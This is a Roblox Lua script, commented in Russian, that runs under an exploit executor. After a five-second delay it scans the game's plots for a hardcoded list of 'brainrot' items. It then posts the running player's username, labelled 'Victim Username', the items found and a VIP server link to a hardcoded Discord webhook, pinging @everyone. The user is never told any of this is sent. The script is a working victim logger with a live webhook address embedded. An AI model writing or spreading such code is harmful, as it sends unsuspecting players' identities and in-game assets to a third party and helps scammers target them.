````lua
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

-- ==============================
-- Конфиг
-- ==============================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"

-- ==============================
-- Глобальные переменные
-- ==============================
_G.VIP_LINK = nil

-- ==============================
-- Список брейнротов
-- ==============================
local CANONICAL_BRAINROT_NAMES = {
	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
	"Garama and Madundung","Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni",
	"Ketupat Kepat","Ketchuru and Musturu","Esok Sekolah","Money Money Puggy",
	"Nuclearo Dinossauro","La Grande Combinasion","Chicleteira Bicicleteira",
	"Los Chicleteiras","To to to Sahur","Graipuss Medussi","Strawberry Elephant",
	"67","La Extinct Grande","Mariachi Corazoni","Tacorita Bicicleta",
	"Los Nooo My Hotspotsitos","La Karkerkar Combinasion","Los Bros","Los Primos",
	"Tralaledon","Los Tacoritas","La Sahur Combinasion","Fragola La La La",
	"Los Hotspotsitos","La Supreme Combinasion","Los Combinasionas",
	"Los Tungtungtungcitos","Noo My Examen","Yess my Examen","Secret Lucky Block",
	"Admin Lucky Block","Quesadilla Crocodila","Torrtuginni Dragonfruitini",
	"Agarrini la Palini","Karkerkar Kurkur","Los Matteos",
	"Celularcini Viciosini","Las Vaquitas Saturnitas",
}

local LOWER_TO_CANON = {}
for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
	LOWER_TO_CANON[string.lower(name)] = name
end

local function getCanonicalMatch(name)
	local lname = string.lower(name)
	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
		if string.find(lname, lowerCanonical, 1, true) then
			return canonical
		end
	end
	return nil
end

local function isBrainrotInstance(inst)
	if not inst then return false end
	return getCanonicalMatch(inst.Name) ~= nil
end

local function collectBrainrotsInPlot(plot)
	local results, seenCanonical = {}, {}
	for _, d in ipairs(plot:GetDescendants()) do
		if isBrainrotInstance(d) then
			local canonical = getCanonicalMatch(d.Name) or d.Name
			if not seenCanonical[canonical] then
				seenCanonical[canonical] = true
				table.insert(results, canonical)
			end
		end
	end
	return results
end

-- ==============================
-- Webhook
-- ==============================
local function sendWebhook(brainrotsList, vipLink)
	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
	if not req then return end

	local content = "@everyone WAKE UP"
	local fields = {
		{
			["name"] = ":man_standing: Victim Username:",
			["value"] = "```\n" .. Players.LocalPlayer.Name .. "\n```",
			["inline"] = false
		},
		{
			["name"] = ":ringed_planet: Brainrots List:",
			["value"] = "```\n" .. (brainrotsList ~= "" and brainrotsList or "None") .. "\n```",
			["inline"] = false
		},
		{
			["name"] = ":link: Vip:",
			["value"] = "```\n" .. (vipLink or "None") .. "\n```",
			["inline"] = false
		}
	}

	local payload = {
		["content"] = content,
		["embeds"] = {{
			["title"] = ":star: Brainrot | Elly",
			["color"] = 65280, -- зелёный (0,255,0)
			["fields"] = fields
		}}
	}

	req({
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = HttpService:JSONEncode(payload)
	})
end

-- ==============================
-- Отчёт по всем плотам
-- ==============================
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")

local function postCombinedAllPlots()
	local sections = {}
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		local entries = collectBrainrotsInPlot(plot)
		for _, e in ipairs(entries) do
			table.insert(sections, e)
		end
	end

	local list = table.concat(sections, "\n")
	sendWebhook(list, _G.VIP_LINK)
end

-- ==============================
-- Запуск
-- ==============================
task.delay(5, function()
	postCombinedAllPlots()
end)
````
